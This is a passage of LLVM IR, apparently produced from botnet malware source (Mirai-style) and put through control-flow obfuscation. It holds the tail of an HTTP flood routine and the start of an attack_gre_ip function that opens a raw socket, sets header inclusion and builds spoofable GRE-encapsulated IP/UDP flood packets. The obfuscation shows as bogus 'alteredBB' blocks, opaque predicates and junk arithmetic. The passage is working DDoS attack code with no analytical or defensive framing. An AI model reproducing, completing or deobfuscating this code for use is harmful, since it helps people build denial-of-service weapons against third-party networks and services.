  %_417 = sub i32 0, %4721
  %gen418 = add i32 %_417, 1
  %_419 = sub i32 0, %4721
  %gen420 = add i32 %_419, 1
  %_421 = sub i32 %4721, 1
  %gen422 = mul i32 %_421, 1
  %4722 = add nsw i32 %4721, 1
  store i32 %4722, i32* %10, align 4
  br label %originalBB410

originalBB426alteredBB:                           ; preds = %originalBB426, %2840
  %4723 = load i8*, i8** %57, align 8
  %4724 = load i32, i32* %10, align 4
  %4725 = sext i32 %4724 to i64
  %4726 = getelementptr inbounds i8, i8* %4723, i64 %4725
  %4727 = load i8, i8* %4726, align 1
  %4728 = sext i8 %4727 to i32
  %4729 = icmp ne i32 %4728, 0
  br label %originalBB426

originalBB430alteredBB:                           ; preds = %originalBB430, %2864
  store i32 0, i32* %58, align 4
  %4730 = load i8*, i8** %57, align 8
  %4731 = load i32, i32* %10, align 4
  %4732 = sext i32 %4731 to i64
  %4733 = getelementptr inbounds i8, i8* %4730, i64 %4732
  store i8 0, i8* %4733, align 1
  %4734 = load i32, i32* %10, align 4
  %_431 = sub i32 %4734, 1
  %gen432 = mul i32 %_431, 1
  %_433 = sub i32 %4734, 1
  %gen434 = mul i32 %_433, 1
  %4735 = add nsw i32 %4734, 1
  store i32 %4735, i32* %10, align 4
  %4736 = load i8*, i8** %57, align 8
  %4737 = load i32, i32* %10, align 4
  %4738 = sext i32 %4737 to i64
  %4739 = getelementptr inbounds i8, i8* %4736, i64 %4738
  %4740 = load i8, i8* %4739, align 1
  %4741 = sext i8 %4740 to i32
  %4742 = icmp eq i32 %4741, 32
  br label %originalBB430

originalBB438alteredBB:                           ; preds = %originalBB438, %2894
  %4743 = load i32, i32* %10, align 4
  %_439 = shl i32 %4743, 1
  %_440 = sub i32 0, %4743
  %gen441 = add i32 %_440, 1
  %_442 = shl i32 %4743, 1
  %_443 = sub i32 0, %4743
  %gen444 = add i32 %_443, 1
  %_445 = shl i32 %4743, 1
  %_446 = shl i32 %4743, 1
  %_447 = shl i32 %4743, 1
  %4744 = add nsw i32 %4743, 1
  store i32 %4744, i32* %10, align 4
  br label %originalBB438

originalBB451alteredBB:                           ; preds = %originalBB451, %2925
  %4745 = load i8*, i8** %57, align 8
  %4746 = load i32, i32* %10, align 4
  %4747 = sext i32 %4746 to i64
  %4748 = getelementptr inbounds i8, i8* %4745, i64 %4747
  %4749 = load i8*, i8** %57, align 8
  %4750 = load i32, i32* %10, align 4
  %4751 = sext i32 %4750 to i64
  %4752 = getelementptr inbounds i8, i8* %4749, i64 %4751
  %4753 = call i32 @util_strlen(i8* %4752)
  %4754 = call i32 @util_stristr(i8* %4748, i32 %4753, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0))
  %4755 = load i32, i32* %10, align 4
  %_452 = shl i32 %4755, %4754
  %_453 = shl i32 %4755, %4754
  %_454 = shl i32 %4755, %4754
  %_455 = shl i32 %4755, %4754
  %_456 = sub i32 %4755, %4754
  %gen457 = mul i32 %_456, %4754
  %_458 = sub i32 0, %4755
  %gen459 = add i32 %_458, %4754
  %_460 = sub i32 0, %4755
  %gen461 = add i32 %_460, %4754
  %4756 = add nsw i32 %4755, %4754
  store i32 %4756, i32* %10, align 4
  br label %originalBB451

originalBB465alteredBB:                           ; preds = %originalBB465, %3000
  %4757 = load i32, i32* %58, align 4
  %4758 = icmp slt i32 %4757, 10
  br label %originalBB465

originalBB469alteredBB:                           ; preds = %originalBB469, %3030
  %4759 = load i8*, i8** %57, align 8
  %4760 = load i32, i32* %10, align 4
  %4761 = sext i32 %4760 to i64
  %4762 = getelementptr inbounds i8, i8* %4759, i64 %4761
  store i8* %4762, i8** %57, align 8
  %4763 = load i8*, i8** %57, align 8
  %4764 = load i8*, i8** %57, align 8
  %4765 = call i32 @util_strlen(i8* %4764)
  %4766 = call i32 @util_stristr(i8* %4763, i32 %4765, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i32 0, i32 0))
  %4767 = icmp eq i32 %4766, 4
  br label %originalBB469

originalBB473alteredBB:                           ; preds = %originalBB473, %3062
  %4768 = load i32, i32* %10, align 4
  %_474 = sub i32 0, %4768
  %gen475 = add i32 %_474, 1
  %_476 = shl i32 %4768, 1
  %_477 = sub i32 %4768, 1
  %gen478 = mul i32 %_477, 1
  %_479 = sub i32 %4768, 1
  %gen480 = mul i32 %_479, 1
  %4769 = add nsw i32 %4768, 1
  store i32 %4769, i32* %10, align 4
  br label %originalBB473

originalBB484alteredBB:                           ; preds = %originalBB484, %3112
  %4770 = load i32, i32* %10, align 4
  %_485 = sub i32 0, %4770
  %gen486 = add i32 %_485, 1
  %_487 = sub i32 %4770, 1
  %gen488 = mul i32 %_487, 1
  %_489 = shl i32 %4770, 1
  %_490 = shl i32 %4770, 1
  %4771 = add nsw i32 %4770, 1
  store i32 %4771, i32* %10, align 4
  br label %originalBB484

originalBB494alteredBB:                           ; preds = %originalBB494, %3135
  %4772 = load i8*, i8** %57, align 8
  %4773 = call i32 @util_strlen(i8* %4772)
  %4774 = icmp slt i32 %4773, 128
  br label %originalBB494

originalBB498alteredBB:                           ; preds = %originalBB498, %3161
  %4775 = load i8*, i8** %57, align 8
  %4776 = load i32, i32* %10, align 4
  %_499 = sub i32 0, %4776
  %gen500 = add i32 %_499, 1
  %_501 = shl i32 %4776, 1
  %_502 = sub i32 %4776, 1
  %gen503 = mul i32 %_502, 1
  %4777 = add nsw i32 %4776, 1
  %4778 = sext i32 %4777 to i64
  %4779 = getelementptr inbounds i8, i8* %4775, i64 %4778
  %4780 = call i32 @util_strlen(i8* %4779)
  %4781 = icmp slt i32 %4780, 256
  br label %originalBB498

originalBB507alteredBB:                           ; preds = %originalBB507, %3185
  %4782 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4783 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4782, i32 0, i32 6
  %4784 = getelementptr inbounds [257 x i8], [257 x i8]* %4783, i32 0, i32 0
  %4785 = getelementptr inbounds i8, i8* %4784, i64 1
  call void @util_zero(i8* %4785, i32 255)
  %4786 = load i8*, i8** %57, align 8
  %4787 = load i32, i32* %10, align 4
  %_508 = sub i32 0, %4787
  %gen509 = add i32 %_508, 1
  %_510 = sub i32 %4787, 1
  %gen511 = mul i32 %_510, 1
  %_512 = shl i32 %4787, 1
  %_513 = sub i32 %4787, 1
  %gen514 = mul i32 %_513, 1
  %4788 = add nsw i32 %4787, 1
  %4789 = sext i32 %4788 to i64
  %4790 = getelementptr inbounds i8, i8* %4786, i64 %4789
  %4791 = call i32 @util_strlen(i8* %4790)
  %4792 = icmp sgt i32 %4791, 0
  br label %originalBB507

originalBB518alteredBB:                           ; preds = %originalBB518, %3213
  %4793 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4794 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4793, i32 0, i32 6
  %4795 = getelementptr inbounds [257 x i8], [257 x i8]* %4794, i32 0, i32 0
  %4796 = getelementptr inbounds i8, i8* %4795, i64 1
  %4797 = load i8*, i8** %57, align 8
  %4798 = load i32, i32* %10, align 4
  %_519 = sub i32 %4798, 1
  %gen520 = mul i32 %_519, 1
  %_521 = sub i32 %4798, 1
  %gen522 = mul i32 %_521, 1
  %4799 = add nsw i32 %4798, 1
  %4800 = sext i32 %4799 to i64
  %4801 = getelementptr inbounds i8, i8* %4797, i64 %4800
  %4802 = call i32 @util_strcpy(i8* %4796, i8* %4801)
  br label %originalBB518

originalBB526alteredBB:                           ; preds = %originalBB526, %3240
  br label %originalBB526

originalBB530alteredBB:                           ; preds = %originalBB530, %3264
  %4803 = load i8*, i8** %57, align 8
  %4804 = load i32, i32* %10, align 4
  %_531 = sub i32 0, %4804
  %gen532 = add i32 %_531, 1
  %_533 = sub i32 0, %4804
  %gen534 = add i32 %_533, 1
  %_535 = sub i32 0, %4804
  %gen536 = add i32 %_535, 1
  %_537 = sub i32 0, %4804
  %gen538 = add i32 %_537, 1
  %_539 = sub i32 0, %4804
  %gen540 = add i32 %_539, 1
  %_541 = shl i32 %4804, 1
  %_542 = sub i32 0, %4804
  %gen543 = add i32 %_542, 1
  %_544 = sub i32 0, %4804
  %gen545 = add i32 %_544, 1
  %4805 = add nsw i32 %4804, 1
  %4806 = sext i32 %4805 to i64
  %4807 = getelementptr inbounds i8, i8* %4803, i64 %4806
  %4808 = call i32 @util_strlen(i8* %4807)
  %4809 = icmp slt i32 %4808, 256
  br label %originalBB530

originalBB549alteredBB:                           ; preds = %originalBB549, %3300
  %4810 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4811 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4810, i32 0, i32 6
  %4812 = getelementptr inbounds [257 x i8], [257 x i8]* %4811, i32 0, i32 0
  %4813 = getelementptr inbounds i8, i8* %4812, i64 1
  %4814 = load i8*, i8** %57, align 8
  %4815 = load i32, i32* %10, align 4
  %_550 = shl i32 %4815, 1
  %_551 = sub i32 0, %4815
  %gen552 = add i32 %_551, 1
  %_553 = shl i32 %4815, 1
  %_554 = sub i32 %4815, 1
  %gen555 = mul i32 %_554, 1
  %4816 = add nsw i32 %4815, 1
  %4817 = sext i32 %4816 to i64
  %4818 = getelementptr inbounds i8, i8* %4814, i64 %4817
  %4819 = call i32 @util_strcpy(i8* %4813, i8* %4818)
  br label %originalBB549

originalBB559alteredBB:                           ; preds = %originalBB559, %3337
  br label %originalBB559

originalBB563alteredBB:                           ; preds = %originalBB563, %3375
  %4820 = load i32, i32* %12, align 4
  %4821 = load i32, i32* %37, align 4
  %4822 = icmp sgt i32 %4820, %4821
  br label %originalBB563

originalBB567alteredBB:                           ; preds = %originalBB567, %3418
  %4823 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4824 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4823, i32 0, i32 1
  %4825 = load i8, i8* %4824, align 4
  %4826 = zext i8 %4825 to i32
  %4827 = icmp ne i32 %4826, 7
  br label %originalBB567

originalBB571alteredBB:                           ; preds = %originalBB571, %3446
  %4828 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4829 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4828, i32 0, i32 18
  %4830 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4829, i32 0, i32 0
  %4831 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4832 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4831, i32 0, i32 18
  %4833 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4832, i32 0, i32 0
  %4834 = getelementptr inbounds i8, i8* %4833, i64 64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %4830, i8* %4834, i64 960, i32 1, i1 false)
  %4835 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4836 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4835, i32 0, i32 17
  %4837 = load i32, i32* %4836, align 4
  %_572 = shl i32 %4837, 64
  %_573 = sub i32 0, %4837
  %gen574 = add i32 %_573, 64
  %_575 = sub i32 %4837, 64
  %gen576 = mul i32 %_575, 64
  %4838 = sub nsw i32 %4837, 64
  store i32 %4838, i32* %4836, align 4
  br label %originalBB571

originalBB580alteredBB:                           ; preds = %originalBB580, %3505
  %4839 = call i32* @__errno_location() #7
  %4840 = load i32, i32* %4839, align 4
  %4841 = icmp ne i32 %4840, 11
  br label %originalBB580

originalBB584alteredBB:                           ; preds = %originalBB584, %3534
  br label %originalBB584

originalBB588alteredBB:                           ; preds = %originalBB588, %3551
  %4842 = load i32, i32* %12, align 4
  %4843 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4844 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4843, i32 0, i32 17
  %4845 = load i32, i32* %4844, align 4
  %_589 = sub i32 0, %4845
  %gen590 = add i32 %_589, %4842
  %_591 = sub i32 %4845, %4842
  %gen592 = mul i32 %_591, %4842
  %_593 = sub i32 0, %4845
  %gen594 = add i32 %_593, %4842
  %_595 = sub i32 %4845, %4842
  %gen596 = mul i32 %_595, %4842
  %_597 = sub i32 %4845, %4842
  %gen598 = mul i32 %_597, %4842
  %_599 = sub i32 0, %4845
  %gen600 = add i32 %_599, %4842
  %_601 = sub i32 0, %4845
  %gen602 = add i32 %_601, %4842
  %4846 = add nsw i32 %4845, %4842
  store i32 %4846, i32* %4844, align 4
  %4847 = load i32, i32* %27, align 4
  %4848 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4849 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4848, i32 0, i32 2
  store i32 %4847, i32* %4849, align 4
  br label %originalBB588

originalBB606alteredBB:                           ; preds = %originalBB606, %3608
  %4850 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4851 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4850, i32 0, i32 18
  %4852 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4851, i32 0, i32 0
  %4853 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4854 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4853, i32 0, i32 17
  %4855 = load i32, i32* %4854, align 4
  %4856 = call i8* @table_retrieve_val(i32 43, i32* null)
  %4857 = call i32 @util_memsearch(i8* %4852, i32 %4855, i8* %4856, i32 11)
  %4858 = icmp ne i32 %4857, -1
  br label %originalBB606

originalBB610alteredBB:                           ; preds = %originalBB610, %3766
  br label %originalBB610

originalBB614alteredBB:                           ; preds = %originalBB614, %3833
  %4859 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4860 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4859, i32 0, i32 18
  %4861 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4860, i32 0, i32 0
  %4862 = call i32 @util_atoi(i8* %4861, i32 16)
  store i32 %4862, i32* %63, align 4
  %4863 = load i32, i32* %63, align 4
  %4864 = icmp eq i32 %4863, 0
  br label %originalBB614

originalBB618alteredBB:                           ; preds = %originalBB618, %3856
  %4865 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4866 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4865, i32 0, i32 1
  store i8 1, i8* %4866, align 4
  br label %originalBB618

originalBB622alteredBB:                           ; preds = %originalBB622, %3882
  %4867 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4868 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4867, i32 0, i32 17
  %4869 = load i32, i32* %4868, align 4
  %4870 = load i32, i32* %59, align 4
  %_623 = shl i32 %4869, %4870
  %4871 = sub nsw i32 %4869, %4870
  %4872 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4873 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4872, i32 0, i32 14
  store i32 %4871, i32* %4873, align 4
  %4874 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4875 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4874, i32 0, i32 14
  %4876 = load i32, i32* %4875, align 4
  %4877 = icmp eq i32 %4876, 0
  br label %originalBB622

originalBB627alteredBB:                           ; preds = %originalBB627, %3910
  %4878 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4879 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4878, i32 0, i32 1
  store i8 1, i8* %4879, align 4
  br label %originalBB627

originalBB631alteredBB:                           ; preds = %originalBB631, %3931
  %4880 = load i32, i32* %59, align 4
  %4881 = icmp eq i32 %4880, 0
  br label %originalBB631

originalBB635alteredBB:                           ; preds = %originalBB635, %3950
  br label %originalBB635

originalBB639alteredBB:                           ; preds = %originalBB639, %3997
  br label %originalBB639

originalBB643alteredBB:                           ; preds = %originalBB643, %4015
  br label %originalBB643

originalBB647alteredBB:                           ; preds = %originalBB647, %4041
  %4882 = call i32* @__errno_location() #7
  store i32 0, i32* %4882, align 4
  %4883 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4884 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4883, i32 0, i32 0
  %4885 = load i32, i32* %4884, align 4
  %4886 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %4887 = call i64 @recv(i32 %4885, i8* %4886, i64 10240, i32 16384)
  %4888 = trunc i64 %4887 to i32
  store i32 %4888, i32* %12, align 4
  %4889 = load i32, i32* %12, align 4
  %4890 = icmp eq i32 %4889, 0
  br label %originalBB647

originalBB651alteredBB:                           ; preds = %originalBB651, %4067
  %4891 = call i32* @__errno_location() #7
  store i32 104, i32* %4891, align 4
  store i32 -1, i32* %12, align 4
  br label %originalBB651

originalBB655alteredBB:                           ; preds = %originalBB655, %4088
  %4892 = call i32* @__errno_location() #7
  %4893 = load i32, i32* %4892, align 4
  %4894 = icmp ne i32 %4893, 11
  br label %originalBB655

originalBB659alteredBB:                           ; preds = %originalBB659, %4108
  %4895 = call i32* @__errno_location() #7
  %4896 = load i32, i32* %4895, align 4
  %4897 = icmp ne i32 %4896, 11
  br label %originalBB659

originalBB663alteredBB:                           ; preds = %originalBB663, %4128
  %4898 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4899 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4898, i32 0, i32 0
  %4900 = load i32, i32* %4899, align 4
  %4901 = call i32 @close(i32 %4900)
  %4902 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4903 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4902, i32 0, i32 0
  store i32 -1, i32* %4903, align 4
  %4904 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4905 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4904, i32 0, i32 1
  store i8 0, i8* %4905, align 4
  br label %originalBB663

originalBB667alteredBB:                           ; preds = %originalBB667, %4161
  %4906 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4907 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4906, i32 0, i32 1
  store i8 1, i8* %4907, align 4
  br label %originalBB667

originalBB671alteredBB:                           ; preds = %originalBB671, %4180
  br label %originalBB671

originalBB675alteredBB:                           ; preds = %originalBB675, %4197
  br label %originalBB675

originalBB679alteredBB:                           ; preds = %originalBB679, %4216
  br label %originalBB679
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

declare i32 @util_strlen(i8*) #3

declare i32 @util_strcpy(i8*, i8*) #3

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #2

; Function Attrs: nounwind
declare i64 @time(i64*) #1

declare i32 @close(i32) #3

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #2

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

declare void @util_zero(i8*, i32) #3

declare i8* @util_itoa(i32, i32, i8*) #3

declare signext i8 @util_strcmp(i8*, i8*) #3

declare i64 @send(i32, i8*, i64, i32) #3

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

declare i64 @recv(i32, i8*, i64, i32) #3

declare i32 @util_stristr(i8*, i32, i8*) #3

declare signext i8 @util_strncmp(i8*, i8*, i32) #3

declare i32 @sleep(i32) #3

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_gre_ip(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.grehdr*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.udphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca %struct.iphdr*, align 8
  %31 = alloca %struct.grehdr*, align 8
  %32 = alloca %struct.iphdr*, align 8
  %33 = alloca %struct.udphdr*, align 8
  %34 = alloca i8*, align 8
  %35 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %36 = load i8, i8* %7, align 1
  %37 = zext i8 %36 to i64
  %38 = call noalias i8* @calloc(i64 %37, i64 8) #6
  %39 = bitcast i8* %38 to i8**
  store i8** %39, i8*** %13, align 8
  %40 = load i8, i8* %9, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %42 = call i32 @attack_get_opt_int(i8 zeroext %40, %struct.attack_option* %41, i8 zeroext 2, i32 0)
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %14, align 1
  %44 = load i8, i8* %9, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 3, i32 65535)
  %47 = trunc i32 %46 to i16
  store i16 %47, i16* %15, align 2
  %48 = load i8, i8* %9, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 4, i32 64)
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %16, align 1
  %52 = load i8, i8* %9, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 5, i32 1)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %17, align 1
  %56 = load i8, i8* %9, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 6, i32 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %18, align 2
  %60 = load i8, i8* %9, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 7, i32 65535)
  %63 = trunc i32 %62 to i16
  store i16 %63, i16* %19, align 2
  %64 = load i8, i8* %9, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 0, i32 512)
  store i32 %66, i32* %20, align 4
  %67 = load i8, i8* %9, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %69 = call i32 @attack_get_opt_int(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 1, i32 1)
  %70 = trunc i32 %69 to i8
  store i8 %70, i8* %21, align 1
  %71 = load i8, i8* %9, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 18, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %22, align 1
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = load i32, i32* @LOCAL_ADDR, align 4
  %78 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 24, i32 %77)
  store i32 %78, i32* %23, align 4
  %79 = call i64 @time(i64* null) #6
  %80 = load i32, i32* %6, align 4
  %81 = sext i32 %80 to i64
  %82 = add nsw i64 %79, %81
  %83 = trunc i64 %82 to i32
  store i32 %83, i32* %24, align 4
  %84 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %84, i32* %12, align 4
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %86, label %87

; <label>:86:                                     ; preds = %5
  br label %659

; <label>:87:                                     ; preds = %5
  store i32 1, i32* %11, align 4
  %88 = load i32, i32* %12, align 4
  %89 = bitcast i32* %11 to i8*
  %90 = call i32 @setsockopt(i32 %88, i32 0, i32 3, i8* %89, i32 4) #6
  %91 = icmp eq i32 %90, -1
  br i1 %91, label %92, label %95

; <label>:92:                                     ; preds = %87
  %93 = load i32, i32* %12, align 4
  %94 = call i32 @close(i32 %93)
  br label %659

; <label>:95:                                     ; preds = %87
  store i32 0, i32* %11, align 4
  br label %96

; <label>:96:                                     ; preds = %294, %95
  %97 = load i32, i32* @x.19
  %98 = load i32, i32* @y.20
  %99 = sub i32 %97, 1
  %100 = mul i32 %97, %99
  %101 = urem i32 %100, 2
  %102 = icmp eq i32 %101, 0
  %103 = icmp slt i32 %98, 10
  %104 = or i1 %102, %103
  br i1 %104, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %96
  %105 = load i32, i32* %11, align 4
  %106 = load i8, i8* %7, align 1
  %107 = zext i8 %106 to i32
  %108 = icmp slt i32 %105, %107
  %109 = load i32, i32* @x.19
  %110 = load i32, i32* @y.20
  %111 = sub i32 %109, 1
  %112 = mul i32 %109, %111
  %113 = urem i32 %112, 2
  %114 = icmp eq i32 %113, 0
  %115 = icmp slt i32 %110, 10
  %116 = or i1 %114, %115
  br i1 %116, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %108, label %117, label %297

; <label>:117:                                    ; preds = %originalBBpart2
  %118 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %119 = load i8**, i8*** %13, align 8
  %120 = load i32, i32* %11, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8*, i8** %119, i64 %121
  store i8* %118, i8** %122, align 8
  %123 = load i8**, i8*** %13, align 8
  %124 = load i32, i32* %11, align 4
  %125 = sext i32 %124 to i64
  %126 = getelementptr inbounds i8*, i8** %123, i64 %125
  %127 = load i8*, i8** %126, align 8
  %128 = bitcast i8* %127 to %struct.iphdr*
  store %struct.iphdr* %128, %struct.iphdr** %25, align 8
  %129 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %130 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %129, i64 1
  %131 = bitcast %struct.iphdr* %130 to %struct.grehdr*
  store %struct.grehdr* %131, %struct.grehdr** %26, align 8
  %132 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %133 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %132, i64 1
  %134 = bitcast %struct.grehdr* %133 to %struct.iphdr*
  store %struct.iphdr* %134, %struct.iphdr** %27, align 8
  %135 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %136 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %135, i64 1
  %137 = bitcast %struct.iphdr* %136 to %struct.udphdr*
  store %struct.udphdr* %137, %struct.udphdr** %28, align 8
  %138 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %139 = bitcast %struct.iphdr* %138 to i8*
  %140 = load i8, i8* %139, align 4
  %141 = and i8 %140, 15
  %142 = or i8 %141, 64
  store i8 %142, i8* %139, align 4
  %143 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %144 = bitcast %struct.iphdr* %143 to i8*
  %145 = load i8, i8* %144, align 4
  %146 = and i8 %145, -16
  %147 = or i8 %146, 5
  store i8 %147, i8* %144, align 4
  %148 = load i8, i8* %14, align 1
  %149 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %150 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %149, i32 0, i32 1
  store i8 %148, i8* %150, align 1
  %151 = load i32, i32* %20, align 4
  %152 = sext i32 %151 to i64
  %153 = add i64 52, %152
  %154 = trunc i64 %153 to i16
  %155 = call zeroext i16 @htons(i16 zeroext %154) #7
  %156 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %157 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %156, i32 0, i32 2
  store i16 %155, i16* %157, align 2
  %158 = load i16, i16* %15, align 2
  %159 = call zeroext i16 @htons(i16 zeroext %158) #7
  %160 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %161 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %160, i32 0, i32 3
  store i16 %159, i16* %161, align 4
  %162 = load i8, i8* %16, align 1
  %163 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %164 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %163, i32 0, i32 5
  store i8 %162, i8* %164, align 4
  %165 = load i8, i8* %17, align 1
  %166 = icmp ne i8 %165, 0
  br i1 %166, label %167, label %187

; <label>:167:                                    ; preds = %117
  %168 = load i32, i32* @x.19
